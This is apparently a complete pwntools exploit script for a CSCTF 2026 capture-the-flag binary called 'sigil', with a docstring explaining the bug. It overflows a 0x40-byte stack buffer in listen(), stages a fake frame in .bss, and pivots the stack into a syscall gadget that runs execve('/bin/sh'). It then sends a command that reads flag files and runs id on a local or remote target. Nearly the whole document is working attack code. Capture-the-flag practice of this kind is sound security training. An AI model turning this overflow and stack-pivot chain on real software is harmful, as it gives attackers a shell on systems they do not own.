#!/usr/bin/env python3
"""
sigil - CSCTF 2026 pwn (900 pts)

Bug: listen() reads 0x400 bytes into a 0x40 byte stack buffer -> straight overflow.
     No stack canary, no PIE, static, -nostdlib.

Key observation: sys3() loads the syscall registers FROM MEMORY relative to rbp:
    0x401014  mov rax,[rbp-0x18]
    0x401018  mov rdi,[rbp-0x20]
    0x40101c  mov rsi,[rbp-0x28]
    0x401020  mov rdx,[rbp-0x30]
    0x401024  syscall
So jumping to 0x401014 with a controlled rbp gives full control of a syscall --
no SROP, no pop-gadgets needed (the binary only has `pop rbp; ret`).

Chain:
  read #1 (the overflow): 64 junk + fake_rbp(0x404040) + ret 0x401068
          0x401068 is the "read(0, rbp-0x40, 0x400)" call site inside listen().
  read #2: writes our whole plan into the .bss page (0x404000-0x404fff is RW).
          After it returns, listen's `leave; ret` pivots the stack onto the bss:
          rsp = 0x404040 -> pop rbp = our rbp2, ret = 0x401014 -> execve("/bin/sh").
"""
import sys
from pwn import *

context.arch = "amd64"
context.log_level = "info"

EXE = "dist/sigil"

READ_AGAIN = 0x401068   # leaq -0x40(%rbp),%rax ; read(0, rbp-0x40, 0x400)
SYS_REGS   = 0x401014   # mov rax/rdi/rsi/rdx from [rbp-0x18/0x20/0x28/0x30]; syscall

BSS   = 0x404000
RBP1  = BSS + 0x40      # read #2 lands at BSS, pivot happens at BSS+0x40
RBP2  = BSS + 0x180     # sys3 reads its syscall args around here
BINSH = BSS + 0x200
ARGV  = BSS + 0x210


def build():
    # ---- payload 1: stack overflow -------------------------------------
    p1 = b"A" * 64 + p64(RBP1) + p64(READ_AGAIN)

    # ---- payload 2: the bss image --------------------------------------
    buf = bytearray(0x220)

    def put(addr, data):
        off = addr - BSS
        buf[off:off + len(data)] = data

    # the pivot: leave -> rsp=RBP1 ; pop rbp -> RBP2 ; ret -> SYS_REGS
    put(BSS + 0x40, p64(RBP2))
    put(BSS + 0x48, p64(SYS_REGS))

    # syscall arguments read relative to RBP2
    put(RBP2 - 0x18, p64(constants.SYS_execve))  # rax = 59
    put(RBP2 - 0x20, p64(BINSH))                 # rdi = "/bin/sh"
    put(RBP2 - 0x28, p64(ARGV))                  # rsi = argv
    put(RBP2 - 0x30, p64(0))                     # rdx = envp = NULL

    put(BINSH, b"/bin/sh\x00")
    put(ARGV,  p64(BINSH) + p64(0))

    return p1, bytes(buf)


def main():
    if len(sys.argv) > 1 and ":" in sys.argv[1]:
        host, port = sys.argv[1].rsplit(":", 1)
        io = remote(host, int(port))
    else:
        io = process(sys.argv[1] if len(sys.argv) > 1 else EXE)

    p1, p2 = build()

    io.recvuntil(b"speak the sigil: ")
    io.send(p1)
    sleep(0.3)
    io.send(p2)
    sleep(0.3)

    io.sendline(b"cat /flag* /home/*/flag* 2>/dev/null; echo ---; id")
    out = io.recvrepeat(2.0)
    print(out.decode(errors="replace"))

    import re
    m = re.search(rb"CSCTF\{[^}]*\}", out)
    if m:
        log.success("FLAG: " + m.group(0).decode())
    else:
        io.interactive()


if __name__ == "__main__":
    main()
